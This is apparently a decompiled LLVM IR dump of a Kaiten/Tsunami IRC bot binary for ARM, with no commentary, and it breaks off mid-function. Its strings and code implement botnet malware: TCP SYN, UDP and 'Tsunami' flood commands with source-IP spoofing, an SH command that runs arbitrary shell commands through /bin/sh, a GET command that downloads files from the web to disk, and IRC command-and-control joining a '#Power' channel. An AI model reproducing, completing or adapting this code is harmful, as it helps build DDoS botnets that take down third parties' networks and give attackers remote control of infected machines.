source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_c180.3 = constant i32 -509558771
@global_var_22eb4.6 = global i32 0
@global_var_25608.10 = global i32 0
@global_var_18530.12 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_22eb0.14 = local_unnamed_addr global i32 0
@global_var_2571c.16 = global i32 0
@global_var_22eac.20 = global i32 0
@global_var_18550.23 = constant [16 x i8] c"/usr/dict/words\00"
@1 = constant i32 114
@global_var_25600.29 = global i32 0
@global_var_18564.31 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_18580.33 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_185a4.35 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_185cc.37 = constant [8 x i8] c"http://\00"
@global_var_185d4.39 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_185fc.41 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_18624.43 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_18738.45 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_18754.47 = constant [3 x i8] c"wb\00"
@global_var_18758.49 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_18760.51 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_18778.55 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_18798.57 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_187c8.59 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_187e8.61 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_18800.63 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_18838.65 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_18844.67 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_18860.70 = constant [9 x i8] c"Disabled\00"
@global_var_1886c.72 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_18888.74 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_188ac.76 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_188cc.78 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_25500.80 = global i32 0
@global_var_188f4.82 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_18914.84 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_18930.90 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_18950.93 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_1896c.95 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_1898c.97 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_189ac.101 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_189f8.103 = constant [3 x i8] c".0\00"
@global_var_232b4.105 = global i32 0
@global_var_189fc.108 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_18a20.110 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_18a48.112 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_18a64.114 = constant i32 2
@global_var_18ab4.116 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_18adc.118 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_18af4.120 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_18b18.122 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_18b3c.124 = constant [36 x i8] c"NOTICE %s :UNKNOWN <target> <secs>\0A\00"
@global_var_18b60.126 = constant [27 x i8] c"NOTICE %s :Unknowning %s.\0A\00"
@global_var_18b7c.128 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_25710.130 = global i32 0
@global_var_22ea0.132 = global i32 0
@global_var_18b98.134 = constant [119 x i8] c"NOTICE %s :TSUNAMI <target> <secs>                          = Special packeter that wont be blocked by most firewalls\0A\00"
@global_var_18c10.136 = constant [123 x i8] c"NOTICE %s :PAN <target> <port> <secs>                       = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_18c8c.138 = constant [77 x i8] c"NOTICE %s :UDP <target> <port> <secs>                       = A udp flooder\0A\00"
@global_var_18cdc.140 = constant [93 x i8] c"NOTICE %s :UNKNOWN <target> <secs>                          = Another non-spoof udp flooder\0A\00"
@global_var_18d3c.142 = constant [94 x i8] c"NOTICE %s :NICK <nick>                                      = Changes the nick of the client\0A\00"
@global_var_18d9c.144 = constant [79 x i8] c"NOTICE %s :SERVER <server>                                  = Changes servers\0A\00"
@global_var_18dec.146 = constant [89 x i8] c"NOTICE %s :GETSPOOFS                                        = Gets the current spoofing\0A\00"
@global_var_18e48.148 = constant [92 x i8] c"NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet\0A\00"
@global_var_18ea4.150 = constant [103 x i8] c"NOTICE %s :DISABLE                                          = Disables all packeting from this client\0A\00"
@global_var_18f0c.152 = constant [102 x i8] c"NOTICE %s :ENABLE                                           = Enables all packeting from this client\0A\00"
@global_var_18f74.154 = constant [80 x i8] c"NOTICE %s :KILL                                             = Kills the client\0A\00"
@global_var_18fc4.156 = constant [117 x i8] c"NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_1903c.158 = constant [90 x i8] c"NOTICE %s :VERSION                                          = Requests version of client\0A\00"
@global_var_19098.160 = constant [91 x i8] c"NOTICE %s :KILLALL                                          = Kills all current packeting\0A\00"
@global_var_190f4.162 = constant [77 x i8] c"NOTICE %s :HELP                                             = Displays this\0A\00"
@global_var_19144.164 = constant [96 x i8] c"NOTICE %s :IRC <command>                                    = Sends this command to the server\0A\00"
@global_var_191a4.166 = constant [82 x i8] c"NOTICE %s :SH <command>                                     = Executes a command\0A\00"
@global_var_191f8.169 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_25718.173 = local_unnamed_addr global i32 0
@global_var_25604.175 = global i32 0
@global_var_19284.177 = constant [5 x i8] c"IRC \00"
@global_var_1928c.181 = constant [4 x i8] c"%s\0A\00"
@global_var_19290.183 = constant [4 x i8] c"SH \00"
@global_var_19294.185 = constant [60 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_192d0.188 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_192e0.190 = constant i32 0
@global_var_192e4.194 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_25714.197 = local_unnamed_addr global i32 0
@global_var_192f4.199 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_19304.201 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1930c.203 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_19318.208 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_19398.221 = constant [6 x i8] c"-bash\00"
@global_var_2560c.225 = local_unnamed_addr global i32 0
@global_var_193a0.228 = constant [7 x i8] c"#Power\00"
@global_var_193a8.231 = constant [7 x i8] c"Powerk\00"
@global_var_193b0.235 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_193dc.239 = constant i32 10
@global_var_193e0.241 = constant i32 42
@global_var_193e4.244 = constant [6 x i8] c"ERROR\00"
@global_var_15cf0.246 = constant i32 436207684
@global_var_254d4.250 = global i32 0
@global_var_ed9c.255 = constant i32 -382906384
@global_var_108e4.259 = constant i32 -382909968
@global_var_232b8.264 = global i32 0
@global_var_232d0.268 = local_unnamed_addr global i32 0
@global_var_196f8.277 = constant [3 x i8] c"-c\00"
@global_var_196ec.279 = constant [8 x i8] c"/bin/sh\00"
@global_var_196f4.281 = constant [3 x i8] c"sh\00"
@global_var_d41c.283 = constant i32 -442695648
@global_var_d7a8.297 = constant i32 -509607926
@global_var_152ac.299 = constant i32 56240
@global_var_15258.302 = constant i32 -369098744
@global_var_196fc.304 = constant i32 0
@global_var_130c8.305 = constant i32 -382909968
@global_var_1317c.306 = constant i32 -382910224
@global_var_19724.309 = constant i32 2949163
@global_var_1971c.311 = constant [7 x i8] c"(null)\00"
@global_var_19730.316 = constant i32 135270416
@global_var_19776.321 = constant i32 327688
@global_var_1978e.322 = constant i32 16843008
@global_var_197b4.327 = constant [8 x i8] c" +0-#'I\00"
@global_var_19738.331 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1979c.333 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1976c.335 = constant i32 252117248
@global_var_1976b.336 = constant i32 117506048
@global_var_1975c.338 = constant i32 331776
@global_var_1974c.340 = constant i32 335616
@global_var_eacc.352 = constant i32 -509607928
@global_var_13fa4.355 = constant i32 436207668
@global_var_f2bc.380 = constant i32 -456978431
@global_var_197cc.389 = constant [8 x i8] c"Success\00"
@global_var_f350.391 = constant i32 -369093878
@global_var_252ec.398 = global i32 0
@global_var_254a4.399 = global i32 0
@global_var_fdbc.412 = constant i32 -478871519
@global_var_10730.421 = constant i32 -382906384
@global_var_254b8.429 = local_unnamed_addr global i32 0
@global_var_12748.431 = constant i32 -509591552
@global_var_10cf0.437 = constant i32 -442564540
@global_var_11b20.462 = constant i32 -369098642
@global_var_1a328.464 = constant i32 0
@global_var_11640.474 = constant i32 436207627
@global_var_254bc.480 = local_unnamed_addr global i32 0
@global_var_d8a4.483 = constant i32 -382909968
@global_var_11598.484 = constant i32 -494075872
@global_var_12774.485 = constant i32 -382910336
@global_var_1a350.489 = constant [11 x i8] c"/proc/stat\00"
@global_var_1a35c.492 = constant i32 32
@global_var_1a360.495 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1a370.497 = constant [10 x i8] c"processor\00"
@global_var_1a394.499 = constant i32 604672
@global_var_11758.502 = constant i32 -369098421
@global_var_254cc.517 = local_unnamed_addr global i32 0
@global_var_254d0.519 = local_unnamed_addr global i32 0
@global_var_1a398.522 = constant [10 x i8] c"/dev/null\00"
@global_var_10b60.523 = constant i32 -442543860
@global_var_d808.528 = constant i32 -382910352
@global_var_121d0.545 = constant i32 -335545171
@global_var_254dc.553 = local_unnamed_addr global i32 0
@global_var_1283c.559 = constant i32 -443088884
@global_var_10210.561 = constant i32 973078536
@global_var_254d8.577 = global i32 0
@global_var_1a378.580 = constant i32 114
@global_var_d500.581 = constant i32 -382906384
@global_var_f4f8.583 = constant i32 -369098743
@global_var_1a9c0.587 = constant [4 x i8] c"inf\00"
@global_var_1a9d8.590 = constant i32 0
@global_var_1a9c3.593 = constant i32 1179535616
@global_var_1a9d0.594 = constant i32 2883630
@global_var_14f9c.624 = constant i32 -478805983
@global_var_1aa24.639 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1aa20.643 = constant [3 x i8] c"%x\00"
@global_var_cda4.656 = constant i32 -382910336
@global_var_25af4.657 = local_unnamed_addr global i32 0
@global_var_254e0.658 = local_unnamed_addr global i32 0
@global_var_25af8.661 = local_unnamed_addr global i32 0
@global_var_16a20.664 = constant i32 -442695584
@global_var_25af0.671 = local_unnamed_addr global i32 0
@global_var_1aa38.673 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1aa70.682 = constant [8 x i8] c"timeout\00"
@global_var_1aa78.684 = constant [9 x i8] c"attempts\00"
@global_var_1aa4c.686 = constant [11 x i8] c"nameserver\00"
@global_var_1aa58.688 = constant [7 x i8] c"domain\00"
@global_var_1aa60.690 = constant [7 x i8] c"search\00"
@global_var_1aa68.692 = constant [8 x i8] c"options\00"
@global_var_1aa84.695 = constant i32 889192450
@global_var_1557c.703 = constant i32 -382909456
@global_var_1aa94.706 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1aaa0.709 = constant [4 x i8] c"# \09\00"
@global_var_17d2c.711 = constant i32 -504313148
@global_var_17d14.712 = constant i32 -483131392
@global_var_17bc0.713 = constant i32 -481229311
@global_var_17d9c.714 = constant i32 -477817729
@global_var_180d8.715 = constant i32 -516685812
@global_var_17fcc.716 = constant i32 -905969571
@global_var_17f00.717 = constant i32 -528203771
@global_var_18160.718 = constant i32 -478079873
@global_var_18144.719 = constant i32 -534704125
@global_var_180f4.720 = constant i32 -534704125
@global_var_1808c.721 = constant i32 -483131392
@global_var_22ea4.8 = external global i8*
@global_var_22ea8.18 = external global i8*
@global_var_22eab.210 = external local_unnamed_addr global i8*
@global_var_22eaa.211 = external local_unnamed_addr global i8*
@global_var_22ea9.212 = external local_unnamed_addr global i8*
@global_var_18560.25 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_80b4() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @function_80d0(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_80d0 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_80d0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_80d0 = load i32, i32* @r4, align 4
  %v2_80d0 = trunc i32 %v1_80d0 to i8
  store i8 %v2_80d0, i8* %arg1, align 1
  %v0_80d4.pr = load i1, i1* @cpsr_n, align 1
  br i1 %v0_80d4.pr, label %bb1, label %.thread

bb1:                                              ; preds = %bb
  %v1_80d4 = load i32, i32* @r4, align 4
  %v2_80d4 = trunc i32 %v1_80d4 to i8
  store i8 %v2_80d4, i8* %arg1, align 1
  br label %.thread

.thread:                                          ; preds = %entry, %bb, %bb1
  ret i32 %tmp

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %.thread, { 2, 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @function_11f40(i32 ptrtoint (i32* @global_var_c180.3 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 99600, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @function_10b60()
  ret i32 %v0_81dc
}

define i32 @function_81ec(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_81ec:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_81f0 = load i32, i32* @r4, align 4
  %v6_81f0 = load i32, i32* @fp, align 4
  store i32 33272, i32* %stack_var_-4, align 4
  %v2_81f4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81f4, i32* @fp, align 4
  %v2_8208 = load i8, i8* %arg1, align 1
  %v7_8214 = icmp eq i8 %v2_8208, 42
  br i1 %v7_8214, label %dec_label_pc_8248, label %dec_label_pc_821c

dec_label_pc_821c:                                ; preds = %dec_label_pc_81ec
  %v7_8220 = icmp eq i8 %v2_8208, 63
  br i1 %v7_8220, label %dec_label_pc_82b8, label %dec_label_pc_8228

dec_label_pc_8228:                                ; preds = %dec_label_pc_821c
  %v2_822c = icmp eq i8 %v2_8208, 0
  br i1 %v2_822c, label %dec_label_pc_8238, label %dec_label_pc_8310

dec_label_pc_8238:                                ; preds = %dec_label_pc_8228
  %v2_823c = load i8, i8* %tmp, align 1
  %v3_823c = zext i8 %v2_823c to i32
  br label %dec_label_pc_8384

dec_label_pc_8248:                                ; preds = %dec_label_pc_81ec
  %v1_824c = add i32 %tmp9, 1
  %v3_8258 = inttoptr i32 %v1_824c to i8*
  %v4_8258 = call i32 @function_81ec(i8* %v3_8258, i32 %arg2)
  %v2_8260 = icmp eq i32 %v4_8258, 0
  br i1 %v2_8260, label %dec_label_pc_82a4, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %dec_label_pc_8248
  %v2_826c = load i8, i8* %tmp, align 1
  %v2_8270 = icmp eq i8 %v2_826c, 0
  br i1 %v2_8270, label %dec_label_pc_82ac, label %dec_label_pc_8278

dec_label_pc_8278:                                ; preds = %dec_label_pc_8268
  %v1_827c = add i32 %arg2, 1
  %v4_8288 = call i32 @function_81ec(i8* nonnull %arg1, i32 %v1_827c)
  %v2_8290 = icmp eq i32 %v4_8288, 0
  br i1 %v2_8290, label %dec_label_pc_82a4, label %dec_label_pc_82ac

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8278, %dec_label_pc_8248
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8268, %dec_label_pc_8278, %dec_label_pc_82a4
  %storemerge4 = phi i32 [ 0, %dec_label_pc_82a4 ], [ 1, %dec_label_pc_8278 ], [ 1, %dec_label_pc_8268 ]
  br label %dec_label_pc_8384

dec_label_pc_82b8:                                ; preds = %dec_label_pc_821c
  %v2_82bc = load i8, i8* %tmp, align 1
  %v2_82c0 = icmp eq i8 %v2_82bc, 0
  br i1 %v2_82c0, label %dec_label_pc_8304, label %dec_label_pc_82c8

dec_label_pc_82c8:                                ; preds = %dec_label_pc_82b8
  %v1_82cc = add i32 %tmp9, 1
  %v1_82d4 = add i32 %arg2, 1
  %v2_82e0 = inttoptr i32 %v1_82cc to i8*
  %v3_82e0 = call i32 @function_81ec(i8* %v2_82e0, i32 %v1_82d4)
  %v2_82e8 = icmp ne i32 %v3_82e0, 0
  %. = zext i1 %v2_82e8 to i32
  br label %dec_label_pc_8304

dec_label_pc_8304:                                ; preds = %dec_label_pc_82c8, %dec_label_pc_82b8
  %storemerge3 = phi i32 [ 1, %dec_label_pc_82b8 ], [ %., %dec_label_pc_82c8 ]
  br label %dec_label_pc_8384

dec_label_pc_8310:                                ; preds = %dec_label_pc_8228
  %v2_8314 = load i8, i8* %arg1, align 1
  %v3_8314 = zext i8 %v2_8314 to i32
  %v1_831c = call i32 @function_cdd8(i32 %v3_8314)
  store i32 %v1_831c, i32* @r4, align 4
  %v2_8328 = load i8, i8* %tmp, align 1
  %v3_8328 = zext i8 %v2_8328 to i32
  %v1_8330 = call i32 @function_cdd8(i32 %v3_8328)
  %v0_8338 = load i32, i32* @r4, align 4
  %v9_8338 = icmp eq i32 %v0_8338, %v1_8330
  br i1 %v9_8338, label %dec_label_pc_8340, label %dec_label_pc_837c

dec_label_pc_8340:                                ; preds = %dec_label_pc_8310
  %v1_8344 = add i32 %tmp9, 1
  %v1_834c = add i32 %arg2, 1
  %v2_8358 = inttoptr i32 %v1_8344 to i8*
  %v3_8358 = call i32 @function_81ec(i8* %v2_8358, i32 %v1_834c)
  %v2_8360 = icmp ne i32 %v3_8358, 0
  %.8 = zext i1 %v2_8360 to i32
  br label %dec_label_pc_837c

dec_label_pc_837c:                                ; preds = %dec_label_pc_8340, %dec_label_pc_8310
  %storemerge = phi i32 [ 1, %dec_label_pc_8310 ], [ %.8, %dec_label_pc_8340 ]
  br label %dec_label_pc_8384

dec_label_pc_8384:                                ; preds = %dec_label_pc_8304, %dec_label_pc_82ac, %dec_label_pc_8238, %dec_label_pc_837c
  %stack_var_-48.0 = phi i32 [ %storemerge4, %dec_label_pc_82ac ], [ %storemerge3, %dec_label_pc_8304 ], [ %v3_823c, %dec_label_pc_8238 ], [ %storemerge, %dec_label_pc_837c ]
  store i32 %v3_81f0, i32* @r4, align 4
  store i32 %v6_81f0, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @function_cdd8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8384, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_82ac, { 2, 1, 0 }
}

define i32 @function_8398(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8398:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_839c = load i32, i32* @r2, align 4
  store i32 %v6_839c, i32* %stack_var_-8, align 4
  %v3_83a0 = load i32, i32* @fp, align 4
  store i32 33704, i32* %stack_var_-16, align 4
  %v2_83a4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_83a4, i32* @fp, align 4
  %v4_83b4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i32* @global_var_22eb4.6 to i32), i32* @r0, align 4
  %v3_83c8 = call i32 @function_cff8(i32 ptrtoint (i32* @global_var_22eb4.6 to i32), i32 %arg2, i32 %v4_83b4)
  store i32 ptrtoint (i32* @global_var_22eb4.6 to i32), i32* @r0, align 4
  %v0_83d0 = call i32 @function_f2e0()
  %v2_83e4 = call i32 @function_cd1c(i32 %arg1, i32 ptrtoint (i32* @global_var_22eb4.6 to i32))
  store i32 %v3_83a0, i32* @fp, align 4
  ret i32 %v2_83e4

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22eb4.6 to i32), { 1, 2, 0, 3 }
}

define i32 @function_8400(i32 %arg1) local_unnamed_addr {
dec_label_pc_8400:
  %stack_var_-4 = alloca i32, align 4
  %v3_8404 = load i32, i32* @fp, align 4
  store i32 33804, i32* %stack_var_-4, align 4
  %v2_8408 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8408, i32* @fp, align 4
  %v2_8418 = load i8, i8* bitcast (i8** @global_var_22ea4.8 to i8*), align 4
  %v7_841c = icmp eq i8 %v2_8418, 1
  br i1 %v7_841c, label %dec_label_pc_8424, label %dec_label_pc_8448

dec_label_pc_8424:                                ; preds = %dec_label_pc_8400
  %v2_8428 = load i32, i32* @global_var_25608.10, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_8438 = call i32 @function_8398(i32 %v2_8428, i32 ptrtoint ([30 x i8]* @global_var_18530.12 to i32))
  br label %dec_label_pc_8548

dec_label_pc_8448:                                ; preds = %dec_label_pc_8400
  %v1_8448 = call i32 @function_cc24(i32 %arg1)
  %v2_8458 = icmp eq i32 %v1_8448, 0
  br i1 %v2_8458, label %dec_label_pc_8460, label %dec_label_pc_846c

dec_label_pc_8460:                                ; preds = %dec_label_pc_8448
  br label %dec_label_pc_8548

dec_label_pc_846c:                                ; preds = %dec_label_pc_8448
  %v2_8470 = load i32, i32* @global_var_22eb0.14, align 4
  %v1_8474 = add i32 %v2_8470, 1
  store i32 %v1_8474, i32* @global_var_22eb0.14, align 4
  %tmp = mul i32 %v2_8470, 4
  %v3_848c = add i32 %tmp, 8
  %v1_8494 = call i32 @function_fd60(i32 %v3_848c)
  %v2_84f012 = load i32, i32* @global_var_22eb0.14, align 4
  %v9_84fc14 = icmp eq i32 %v2_84f012, 1
  br i1 %v9_84fc14, label %dec_label_pc_8504, label %dec_label_pc_84ac

dec_label_pc_84ac:                                ; preds = %dec_label_pc_846c, %dec_label_pc_84ac
  %storemerge116 = phi i32 [ %v1_84e4, %dec_label_pc_84ac ], [ 0, %dec_label_pc_846c ]
  %v3_84b0 = mul i32 %storemerge116, 4
  %v2_84bc = add i32 %v3_84b0, %v1_8494
  %v2_84d0 = load i32, i32* @global_var_2571c.16, align 4
  %v2_84d4 = add i32 %v2_84d0, %v3_84b0
  %v1_84d8 = inttoptr i32 %v2_84d4 to i32*
  %v2_84d8 = load i32, i32* %v1_84d8, align 4
  %v2_84dc = inttoptr i32 %v2_84bc to i32*
  store i32 %v2_84d8, i32* %v2_84dc, align 4
  %v1_84e4 = add i32 %storemerge116, 1
  %v2_84f0 = load i32, i32* @global_var_22eb0.14, align 4
  %v1_84f4 = add i32 %v2_84f0, -1
  %tmp25 = icmp ugt i32 %v1_84f4, %v1_84e4
  br i1 %tmp25, label %dec_label_pc_84ac, label %dec_label_pc_84ec.dec_label_pc_8504_crit_edge

dec_label_pc_84ec.dec_label_pc_8504_crit_edge:    ; preds = %dec_label_pc_84ac
  br label %dec_label_pc_8504

dec_label_pc_8504:                                ; preds = %dec_label_pc_846c, %dec_label_pc_84ec.dec_label_pc_8504_crit_edge
  %v2_84f0.lcssa = phi i32 [ %v2_84f0, %dec_label_pc_84ec.dec_label_pc_8504_crit_edge ], [ %v2_84f012, %dec_label_pc_846c ]
  %v1_8508 = add i32 %v1_8494, -4
  %v3_8514 = mul i32 %v2_84f0.lcssa, 4
  %v2_8518 = add i32 %v1_8508, %v3_8514
  %v2_8520 = inttoptr i32 %v2_8518 to i32*
  store i32 %v1_8448, i32* %v2_8520, align 4
  %v2_8528 = load i32, i32* @global_var_2571c.16, align 4
  store i32 %v2_8528, i32* @r0, align 4
  %v0_8530 = call i32 @function_108e4()
  store i32 %v1_8494, i32* @global_var_2571c.16, align 4
  br label %dec_label_pc_8548

dec_label_pc_8548:                                ; preds = %dec_label_pc_8460, %dec_label_pc_8424, %dec_label_pc_8504
  %v3_8548 = phi i32 [ 0, %dec_label_pc_8460 ], [ 1, %dec_label_pc_8424 ], [ %v1_8448, %dec_label_pc_8504 ]
  store i32 %v3_8404, i32* @fp, align 4
  ret i32 %v3_8548

; uselistorder directives
  uselistorder i32 %v3_84b0, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_84f012, { 1, 0 }
  uselistorder i32 %v1_8494, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8548, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8504, { 1, 0 }
  uselistorder label %dec_label_pc_84ac, { 1, 0 }
}

define i32 @function_8570() local_unnamed_addr {
dec_label_pc_8570:
  %v2_8584 = load i8*, i8** @global_var_22ea8.18, align 4
  %v3_8584 = ptrtoint i8* %v2_8584 to i32
  %v2_8588 = icmp eq i8* %v2_8584, null
  br i1 %v2_8588, label %dec_label_pc_8590, label %dec_label_pc_85a0

dec_label_pc_8590:                                ; preds = %dec_label_pc_8570
  %v0_8590 = call i32 @function_10c88()
  br label %dec_label_pc_860c

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8570
  %v2_85a4 = load i32, i32* @global_var_22eac.20, align 4
  %v7_85a8 = icmp eq i32 %v2_85a4, 1
  br i1 %v7_85a8, label %dec_label_pc_85b0, label %dec_label_pc_85c8

dec_label_pc_85b0:                                ; preds = %dec_label_pc_85a0
  %v2_85bc = call i32 @function_f8e4(i32 %v3_8584)
  br label %dec_label_pc_860c

dec_label_pc_85c8:                                ; preds = %dec_label_pc_85a0
  %v0_85c8 = call i32 @function_10c88()
  %v2_85d8 = load i32, i32* @global_var_22eac.20, align 4
  %v2_85e4 = call i32 @function_ca5c(i32 %v0_85c8, i32 %v2_85d8)
  %v2_85f4 = load i8*, i8** @global_var_22ea8.18, align 4
  %v3_85f4 = ptrtoint i8* %v2_85f4 to i32
  %v2_85f8 = add i32 %v2_85d8, 1
  %v1_85fc = add i32 %v2_85f8, %v3_85f4
  %v1_8604 = call i32 @function_f8e4(i32 %v1_85fc)
  br label %dec_label_pc_860c

dec_label_pc_860c:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_8590, %dec_label_pc_85c8
  %stack_var_-20.0 = phi i32 [ %v0_8590, %dec_label_pc_8590 ], [ %v2_85bc, %dec_label_pc_85b0 ], [ %v1_8604, %dec_label_pc_85c8 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 (i32)* @function_f8e4, { 1, 0 }
  uselistorder label %dec_label_pc_860c, { 2, 0, 1 }
}

define i32 @function_8628(i32 %arg1) local_unnamed_addr {
dec_label_pc_8628:
  %stack_var_0 = alloca i32, align 4
  %v1_8628 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8628, i32* @ip, align 4
  %v1_8664 = add i32 %arg1, -1
  br label %dec_label_pc_8660

dec_label_pc_8640:                                ; preds = %dec_label_pc_8684, %dec_label_pc_8660
  store i32 %arg1, i32* @r0, align 4
